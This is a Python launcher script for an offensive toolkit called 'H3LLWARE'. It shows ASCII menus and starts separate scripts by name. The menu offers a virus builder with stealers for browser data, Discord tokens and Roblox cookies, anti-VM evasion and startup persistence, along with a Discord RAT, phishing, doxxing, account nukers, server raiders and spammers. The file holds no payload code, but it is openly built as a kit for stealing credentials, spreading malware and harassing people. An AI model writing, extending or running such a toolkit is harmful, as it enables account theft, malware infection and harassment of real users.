from Settings.Program.Config.Config import *
from Settings.Program.Config.Util import *
import os
import ctypes

def set_cmd_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

set_cmd_title("H3LLWARE")

try:
   import webbrowser
   import re
except:
   ErrorModule()

def Update():
   popup_version = ""

   try:
      new_version = re.search(r'version_tool\s*=\s*"([^"]+)"', requests.get(url_config).text).group(1)
      if new_version != version_tool:
         colorama.init()
         print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Please install the new version of the tool: {blue + version_tool + blue} -> {blue + new_version}")
         webbrowser.open
         input(f"{BEFORE + current_time_hour() + AFTER} {INFO} Enter to still use this version -> {reset}")
         popup_version = f"{blue}New Version: {blue + version_tool + blue} -> {blue + new_version}"
         colorama.deinit()
   except: 
      pass

   return popup_version

option_01 = "Website-Vulnerability-Scanner"
option_02 = "Website-Info-Scanner"
option_03 = "Website-Url-Scanner"
option_04 = "Ip-Scanner"
option_05 = "Ip-Port-Scanner"
option_06 = "Ip-Pinger"
option_07 = "Soon"
option_08 = "Soon"
option_09 = "Soon"
option_10 = "Soon"

option_11 = "Dox-Create"
option_12 = "Dox-Tracker"
option_13 = "Username-Tracker"
option_14 = "Email-Tracker"
option_15 = "Email-Lookup"
option_16 = "Phone-Number-Lookup"
option_17 = "Ip-Lookup"
option_18 = "Soon"
option_19 = "Soon"
option_20 = "Soon"

option_21 = "Phishing-Attack"
option_22 = "Password-Decrypted-Attack"
option_23 = "Password-Encrypted"
option_24 = "Search-In-DataBase"
option_25 = "Dark-Web-Links"
option_26 = "Ip-Generator"
option_27 = "Soon"
option_28 = "Soon"
option_29 = "Soon"
option_30 = "Soon"

option_31 = "Virus-Builder"

option_32 = "Obfuscator-Tool"
option_33 = "Rat-Discord"
option_34 = "Anonymization-Software"
option_35 = "Soon"
option_36 = "Soon"
option_37 = "Soon"
option_38 = "Soon"
option_39 = "Soon"
option_40 = "Soon"

option_41 = "Roblox-Cookie-Login"
option_42 = "Roblox-Cookie-Info"
option_43 = "Roblox-Id-Info"
option_44 = "Roblox-User-Info"
option_45 = "Soon"
option_46 = "Soon"
option_47 = "Soon"
option_48 = "Soon"
option_49 = "Soon"
option_50 = "Soon"

option_51 = "Discord-Token-Nuker"
option_52 = "Discord-Token-Info"
option_53 = "Discord-Token-Joiner"
option_54 = "Discord-Token-Leaver"
option_55 = "Discord-Token-Login"
option_56 = "Discord-Token-To-Id-And-Brute"
option_57 = "Discord-Token-Server-Raid"
option_58 = "Discord-Token-Spammer"
option_59 = "Discord-Token-Delete-Friends"
option_60 = "Discord-Token-Block-Friends"
option_61 = "Discord-Token-Mass-Dm"
option_62 = "Discord-Token-Delete-Dm"
option_63 = "Discord-Token-Status-Changer"
option_64 = "Discord-Token-Language-Changer"
option_65 = "Discord-Token-House-Changer"
option_66 = "Discord-Token-Theme-Changer"
option_67 = "Discord-Token-Generator"
option_68 = "Discord-Bot-Server-Nuker"
option_69 = "Discord-Bot-Invite-To-Id"
option_70 = "Discord-Server-Info"
option_71 = "Discord-Nitro-Generator"
option_72 = "Discord-Webhook-Info"
option_73 = "Discord-Webhook-Delete"
option_74 = "Discord-Webhook-Spammer"
option_75 = "Discord-Webhook-Generator"
option_76 = "Soon"
option_77 = "Soon"
option_78 = "Soon"
option_79 = "Soon"

option_next = "Next"
option_back = "Back"
option_site = "Site"
option_info = "Info"

option_01_txt = f"{blue}[{blue}01{blue}]{blue} " + option_01.ljust(30)[:30].replace("-", " ")

option_01_txt = f"{blue}[{blue}01{blue}]{blue} " + option_01.ljust(30)[:30].replace("-", " ")
option_02_txt = f"{blue}[{blue}02{blue}]{blue} " + option_02.ljust(30)[:30].replace("-", " ")
option_03_txt = f"{blue}[{blue}03{blue}]{blue} " + option_03.ljust(30)[:30].replace("-", " ")
option_04_txt = f"{blue}[{blue}04{blue}]{blue} " + option_04.ljust(30)[:30].replace("-", " ")
option_05_txt = f"{blue}[{blue}05{blue}]{blue} " + option_05.ljust(30)[:30].replace("-", " ")
option_06_txt = f"{blue}[{blue}06{blue}]{blue} " + option_06.ljust(30)[:30].replace("-", " ")
option_07_txt = f"{blue}[{blue}07{blue}]{blue} " + option_07.ljust(30)[:30].replace("-", " ")
option_08_txt = f"{blue}[{blue}08{blue}]{blue} " + option_08.ljust(30)[:30].replace("-", " ")
option_09_txt = f"{blue}[{blue}09{blue}]{blue} " + option_09.ljust(30)[:30].replace("-", " ")
option_10_txt = f"{blue}[{blue}10{blue}]{blue} " + option_10.ljust(30)[:30].replace("-", " ")

option_11_txt = f"{blue}[{blue}11{blue}]{blue} " + option_11.ljust(30)[:30].replace("-", " ")
option_12_txt = f"{blue}[{blue}12{blue}]{blue} " + option_12.ljust(30)[:30].replace("-", " ")
option_13_txt = f"{blue}[{blue}13{blue}]{blue} " + option_13.ljust(30)[:30].replace("-", " ")
option_14_txt = f"{blue}[{blue}14{blue}]{blue} " + option_14.ljust(30)[:30].replace("-", " ")
option_15_txt = f"{blue}[{blue}15{blue}]{blue} " + option_15.ljust(30)[:30].replace("-", " ")
option_16_txt = f"{blue}[{blue}16{blue}]{blue} " + option_16.ljust(30)[:30].replace("-", " ")
option_17_txt = f"{blue}[{blue}17{blue}]{blue} " + option_17.ljust(30)[:30].replace("-", " ")
option_18_txt = f"{blue}[{blue}18{blue}]{blue} " + option_18.ljust(30)[:30].replace("-", " ")
option_19_txt = f"{blue}[{blue}19{blue}]{blue} " + option_19.ljust(30)[:30].replace("-", " ")
option_20_txt = f"{blue}[{blue}20{blue}]{blue} " + option_20.ljust(30)[:30].replace("-", " ")

option_21_txt = f"{blue}[{blue}21{blue}]{blue} " + option_21.ljust(30)[:30].replace("-", " ")
option_22_txt = f"{blue}[{blue}22{blue}]{blue} " + option_22.ljust(30)[:30].replace("-", " ")
option_23_txt = f"{blue}[{blue}23{blue}]{blue} " + option_23.ljust(30)[:30].replace("-", " ")
option_24_txt = f"{blue}[{blue}24{blue}]{blue} " + option_24.ljust(30)[:30].replace("-", " ")
option_25_txt = f"{blue}[{blue}25{blue}]{blue} " + option_25.ljust(30)[:30].replace("-", " ")
option_26_txt = f"{blue}[{blue}26{blue}]{blue} " + option_26.ljust(30)[:30].replace("-", " ")
option_27_txt = f"{blue}[{blue}27{blue}]{blue} " + option_27.ljust(30)[:30].replace("-", " ")
option_28_txt = f"{blue}[{blue}28{blue}]{blue} " + option_28.ljust(30)[:30].replace("-", " ")
option_29_txt = f"{blue}[{blue}29{blue}]{blue} " + option_29.ljust(30)[:30].replace("-", " ")
option_30_txt = f"{blue}[{blue}30{blue}]{blue} " + option_30.ljust(30)[:30].replace("-", " ")

option_31_txt = f"{blue}[{blue}31{blue}]{blue} " + option_31.ljust(30)[:30].replace("-", " ")
option_35_txt = f"{blue}[{blue}35{blue}]{blue} " + option_35.ljust(30)[:30].replace("-", " ")
option_36_txt = f"{blue}[{blue}36{blue}]{blue} " + option_36.ljust(30)[:30].replace("-", " ")
option_37_txt = f"{blue}[{blue}37{blue}]{blue} " + option_37.ljust(30)[:30].replace("-", " ")
option_38_txt = f"{blue}[{blue}38{blue}]{blue} " + option_38.ljust(30)[:30].replace("-", " ")
option_39_txt = f"{blue}[{blue}39{blue}]{blue} " + option_39.ljust(30)[:30].replace("-", " ")
option_40_txt = f"{blue}[{blue}40{blue}]{blue} " + option_40.ljust(30)[:30].replace("-", " ")

option_41_txt = f"{blue}[{blue}41{blue}]{blue} " + option_41.ljust(30)[:30].replace("-", " ")
option_42_txt = f"{blue}[{blue}42{blue}]{blue} " + option_42.ljust(30)[:30].replace("-", " ")
option_43_txt = f"{blue}[{blue}43{blue}]{blue} " + option_43.ljust(30)[:30].replace("-", " ")
option_44_txt = f"{blue}[{blue}44{blue}]{blue} " + option_44.ljust(30)[:30].replace("-", " ")
option_45_txt = f"{blue}[{blue}45{blue}]{blue} " + option_45.ljust(30)[:30].replace("-", " ")
option_46_txt = f"{blue}[{blue}46{blue}]{blue} " + option_46.ljust(30)[:30].replace("-", " ")
option_47_txt = f"{blue}[{blue}47{blue}]{blue} " + option_47.ljust(30)[:30].replace("-", " ")
option_48_txt = f"{blue}[{blue}48{blue}]{blue} " + option_48.ljust(30)[:30].replace("-", " ")
option_49_txt = f"{blue}[{blue}49{blue}]{blue} " + option_49.ljust(30)[:30].replace("-", " ")
option_50_txt = f"{blue}[{blue}50{blue}]{blue} " + option_50.ljust(30)[:30].replace("-", " ")

option_51_txt = f"{blue}[{blue}51{blue}]{blue} " + option_51.ljust(30)[:30].replace("-", " ")
option_52_txt = f"{blue}[{blue}52{blue}]{blue} " + option_52.ljust(30)[:30].replace("-", " ")
option_53_txt = f"{blue}[{blue}53{blue}]{blue} " + option_53.ljust(30)[:30].replace("-", " ")
option_54_txt = f"{blue}[{blue}54{blue}]{blue} " + option_54.ljust(30)[:30].replace("-", " ")
option_55_txt = f"{blue}[{blue}55{blue}]{blue} " + option_55.ljust(30)[:30].replace("-", " ")
option_56_txt = f"{blue}[{blue}56{blue}]{blue} " + option_56.ljust(30)[:30].replace("-", " ")
option_57_txt = f"{blue}[{blue}57{blue}]{blue} " + option_57.ljust(30)[:30].replace("-", " ")
option_58_txt = f"{blue}[{blue}58{blue}]{blue} " + option_58.ljust(30)[:30].replace("-", " ")
option_59_txt = f"{blue}[{blue}59{blue}]{blue} " + option_59.ljust(30)[:30].replace("-", " ")
option_60_txt = f"{blue}[{blue}60{blue}]{blue} " + option_60.ljust(30)[:30].replace("-", " ")

option_61_txt = f"{blue}[{blue}61{blue}]{blue} " + option_61.ljust(30)[:30].replace("-", " ")
option_62_txt = f"{blue}[{blue}62{blue}]{blue} " + option_62.ljust(30)[:30].replace("-", " ")
option_63_txt = f"{blue}[{blue}63{blue}]{blue} " + option_63.ljust(30)[:30].replace("-", " ")
option_64_txt = f"{blue}[{blue}64{blue}]{blue} " + option_64.ljust(30)[:30].replace("-", " ")
option_65_txt = f"{blue}[{blue}65{blue}]{blue} " + option_65.ljust(30)[:30].replace("-", " ")
option_66_txt = f"{blue}[{blue}66{blue}]{blue} " + option_66.ljust(30)[:30].replace("-", " ")
option_67_txt = f"{blue}[{blue}67{blue}]{blue} " + option_67.ljust(30)[:30].replace("-", " ")
option_68_txt = f"{blue}[{blue}68{blue}]{blue} " + option_68.ljust(30)[:30].replace("-", " ")
option_69_txt = f"{blue}[{blue}69{blue}]{blue} " + option_69.ljust(30)[:30].replace("-", " ")
option_70_txt = f"{blue}[{blue}70{blue}]{blue} " + option_70.ljust(30)[:30].replace("-", " ")

option_71_txt = f"{blue}[{blue}71{blue}]{blue} " + option_71.ljust(30)[:30].replace("-", " ")
option_72_txt = f"{blue}[{blue}72{blue}]{blue} " + option_72.ljust(30)[:30].replace("-", " ")
option_73_txt = f"{blue}[{blue}73{blue}]{blue} " + option_73.ljust(30)[:30].replace("-", " ")
option_74_txt = f"{blue}[{blue}74{blue}]{blue} " + option_74.ljust(30)[:30].replace("-", " ")
option_75_txt = f"{blue}[{blue}75{blue}]{blue} " + option_75.ljust(30)[:30].replace("-", " ")
option_76_txt = f"{blue}[{blue}76{blue}]{blue} " + option_76.ljust(30)[:30].replace("-", " ")
option_77_txt = f"{blue}[{blue}77{blue}]{blue} " + option_77.ljust(30)[:30].replace("-", " ")
option_78_txt = f"{blue}[{blue}78{blue}]{blue} " + option_78.ljust(30)[:30].replace("-", " ")
option_79_txt = f"{blue}[{blue}79{blue}]{blue} " + option_79.ljust(30)[:30].replace("-", " ")

option_back_txt = option_back + f" {blue}[{blue}B{blue}]{blue}"
option_next_txt = option_next + f" {blue}[{blue}N{blue}]{blue}"
option_site_txt = f"{blue}[{blue}S{blue}]{blue} " + option_site
option_info_txt =  f"{blue}[{blue}I{blue}]{blue} " + option_info

menu1 = f""" ┌─                                                                                               {option_next_txt} ─┐
 ├─  ┌─────────────────┐                        ┌───────┐                           ┌───────────┐            │
 └─┬─────────┤ Network Scanner ├─────────┬──────────────┤ Osint ├──────────────┬────────────┤ Utilities ├────────────┴─
   │         └─────────────────┘         │              └───────┘              │            └───────────┘
   ├─ {option_01_txt                    }├─ {option_11_txt                    }├─ {option_21_txt}
   ├─ {option_02_txt                    }├─ {option_12_txt                    }├─ {option_22_txt}
   ├─ {option_03_txt                    }├─ {option_13_txt                    }├─ {option_23_txt}
   ├─ {option_04_txt                    }├─ {option_14_txt                    }├─ {option_24_txt}
   ├─ {option_05_txt                    }├─ {option_15_txt                    }├─ {option_25_txt}
   └─ {option_06_txt                    }├─ {option_16_txt                    }└─ {option_26_txt}
                                         └─ {option_17_txt                    }

"""

menu2 = f""" ┌─                                                                                                 {option_next_txt} ─┐
 ├─   ┌───────────────┐                         ┌──────┐                              ┌────────┐    {option_back_txt} ─┤
─┴─┬──────────┤ Virus Builder ├──────────┬──────────────┤ SOON ├───────────────┬──────────────┤ Roblox ├──────────────┴─
   │          └───────────────┘          │              └──────┘               │             └────────┘
   └─ {option_31_txt                    }├─                                    ├─ {option_41_txt}
           ├─ Stealer                    ├─                                    ├─ {option_42_txt}
           │  ├─ System Info             └─                                    ├─ {option_43_txt}
           │  ├─ Discord Token/Injection                                       └─ {option_44_txt}
           │  ├─ Browser Steal           
           │  ├─ Roblox Cookie                                     
           │  └─ Other                            
           └─ Malware                    
              ├─ Anti VM & Debug                                             
              ├─ Startup                                                    
              └─ Other                          
"""

menu3 = f""" ┌─                                                                                                {option_back_txt} ─┐
 ├─                                                    ┌─────────┐                                                    │
─┴─┬───────────────────────────────────────────────────┤ Discord ├────────────────────────────────────────────────────┘
   │                                                   └─────────┘                       
   ├─ {option_51_txt                    }┌─ {option_61_txt                    }┌─ {option_71_txt}
   ├─ {option_52_txt                    }├─ {option_62_txt                    }├─ {option_72_txt}
   ├─ {option_53_txt                    }├─ {option_63_txt                    }├─ {option_73_txt}
   ├─ {option_54_txt                    }├─ {option_64_txt                    }├─ {option_74_txt}
   ├─ {option_55_txt                    }├─ {option_65_txt                    }├─ {option_75_txt}
   ├─ {option_56_txt                    }├─ {option_66_txt                    }│
   ├─ {option_57_txt                    }├─ {option_67_txt                    }│
   ├─ {option_58_txt                    }├─ {option_68_txt                    }│
   ├─ {option_59_txt                    }├─ {option_69_txt                    }│
   ├─ {option_60_txt                    }├─ {option_70_txt                    }│
   └─────────────────────────────────────┴─────────────────────────────────────┘
"""

menu_path = os.path.join(tool_path, "Settings", "Program", "Config", "Menu.txt")
popup_version = Update()

def Menu():
   try:
      with open(menu_path, "r") as file:
         menu = file.read()
      if menu in "1":
         menu = menu1
         menu_number = "1"
      elif menu in "2":
         menu = menu2
         menu_number = "2"
      elif menu in "3":
         menu = menu3
         menu_number = "3"
      else:
         menu = menu1
         menu_number = "1"
   except:
      menu = menu1
      menu_number = "1"

   banner = f"""{popup_version}                                                                                      
   
██╗  ██╗██████╗ ██╗     ██╗     ██╗    ██╗ █████╗ ██████╗ ███████╗    
██║  ██║╚════██╗██║     ██║     ██║    ██║██╔══██╗██╔══██╗██╔════╝    
███████║ █████╔╝██║     ██║     ██║ █╗ ██║███████║██████╔╝█████╗      
██╔══██║ ╚═══██╗██║     ██║     ██║███╗██║██╔══██║██╔══██╗██╔══╝      
██║  ██║██████╔╝███████╗███████╗╚███╔███╔╝██║  ██║██║  ██║███████╗    
╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    
                                                                      


 {blue}
{menu}"""
   return banner, menu_number


while True:
   try:
      Clear()

      banner, menu_number = Menu()

      Title(f"Menu {menu_number}")
      Slow(MainColor(banner))

      choice = input(MainColor(f""" ┌──({blue}{username_pc}@H3LLWARE)─{blue}[{blue}~/H3LLWARE/page-{menu_number}]
 └─{blue}$ {reset}"""))

      if choice in ['N', 'n', 'NEXT', 'Next', 'next']:
         if menu_number == "1":
            with open(menu_path, "w") as file:
               file.write("2")

         elif menu_number == "2":
            with open(menu_path, "w") as file:
               file.write("3")

         continue

      elif choice in ['B', 'b', 'BACK', 'Back', 'back']:
         if menu_number == "2":
            with open(menu_path, "w") as file:
               file.write("1")

         elif menu_number == "3":
            with open(menu_path, "w") as file:
               file.write("2")

         continue

      elif choice in ['I', 'i', 'INFO', 'Info', 'info']:
         StartProgram(f"{option_info}.py")
         continue
      
      elif choice in ['S', 's', 'SITE', 'Site', 'site']:
         StartProgram(f"{option_site}.py")
         continue

      options = {
         '01': option_01, '02': option_02, '03': option_03, '04': option_04,
         '05': option_05, '06': option_06, '07': option_07, '08': option_08,
         '09': option_09, '10': option_10, '11': option_11, '12': option_12,
         '13': option_13, '14': option_14, '15': option_15, '16': option_16,
         '17': option_17, '18': option_18, '19': option_19, '20': option_20,
         '21': option_21, '22': option_22, '23': option_23, '24': option_24,
         '25': option_25, '26': option_26, '27': option_27, '28': option_28,
         '29': option_29, '30': option_30, '31': option_31, '35': option_35,
        '36': option_36,
         '37': option_37, '38': option_38, '39': option_39, '40': option_40,
         '41': option_41, '42': option_42, '43': option_43, '44': option_44,
         '45': option_45, '46': option_46, '47': option_47, '48': option_48,
         '49': option_49, '50': option_50, '51': option_51, '52': option_52,
         '53': option_53, '54': option_54, '55': option_55, '56': option_56,
         '57': option_57, '58': option_58, '59': option_59, '60': option_60,
         '61': option_61, '62': option_62, '63': option_63, '64': option_64,
         '65': option_65, '66': option_66, '67': option_67, '68': option_68,
         '69': option_69, '70': option_70, '71': option_71, '72': option_72,
         '73': option_73, '74': option_74, '75': option_75, '76': option_76,
         '77': option_77, '78': option_78, '79': option_79
      }

      if choice in options:  
         StartProgram(f"{options[choice]}.py")
      elif '0' + choice in options:
         StartProgram(f"{options['0' + choice]}.py")
      else:
         ErrorChoiceStart()

   except Exception as e:
      Error(e)